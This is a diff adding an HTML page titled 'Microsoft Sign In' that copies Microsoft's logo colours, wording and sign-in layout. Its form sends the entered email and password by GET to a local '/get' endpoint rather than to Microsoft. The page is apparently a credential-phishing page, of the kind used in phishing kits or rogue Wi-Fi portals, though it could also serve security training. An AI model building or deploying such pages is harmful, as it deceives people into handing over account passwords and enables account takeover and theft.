@@ -1,0 +1,141 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Microsoft Sign In</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(135deg, #e0e0e0, #d0d0d0);
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+ .create-account {
+  font-size: 14px;
+  color: #0078d7;
+  text-decoration: none; /* Removes underline */
+  display: inline-block;
+  margin-bottom: 20px;
+}
+    .container {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      text-align: center;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      grid-gap: 10px;
+      margin-bottom: 20px;
+      justify-content: flex-start;
+    }
+
+    .microsoft-logo {
+      display: grid;
+      grid-template-columns: repeat(2, 20px);
+      grid-gap: 2px;
+}
+
+    .square {
+      width: 20px;
+      height: 20px;
+    }
+
+    .red    { background-color: #f25022; }
+    .green  { background-color: #7fba0b; }
+    .blue   { background-color: #00a4ef; }
+    .yellow { background-color: #ffb900; }
+
+    .logo-text {
+      font-size: 24px;
+      font-weight: bold;
+      color: #555;
+    }
+
+    h1 {
+      margin-bottom: 20px;
+      color: #222;
+      font-size: 24px;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: calc(100% - 100px);
+      padding: 12px 20px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+    }
+
+    input:focus {
+      border-color: #0078d7;
+      outline: none;
+    }
+
+    .button {
+      background-color: #0078d7;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 50%;
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .button:hover {
+      background-color: #005a9e;
+    }
+
+    .sign-in-options {
+      font-size: 14px;
+      color: #0078d7;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <div class="microsoft-logo">
+        <div class="square red"></div>
+        <div class="square green"></div>
+        <div class="square blue"></div>
+        <div class="square yellow"></div>
+      </div>
+      <span class="logo-text">Microsoft</span>
+    </div>
+
+    <form action="/get" method="get" id="login-form">
+<h1>Sign In with<br>your Microsoft account</h1>
+      <input name="email" type="text" placeholder="Email, phone, or Skype" required>
+      <input name="password" type="password" placeholder="Password" required>
+      <button type="submit" class="button">Next</button>
+    
+<style>
+  .no-account-text {
+    color: black;
+  }
+</style>
+
+<a href="#" class="create-account">
+  <span class="no-account-text">No account?</span> Create one!
+</a>
+
+</form>
+
+    <div class="sign-in-options">Sign-in options</div>
+  </div>
+</body>
+</html>
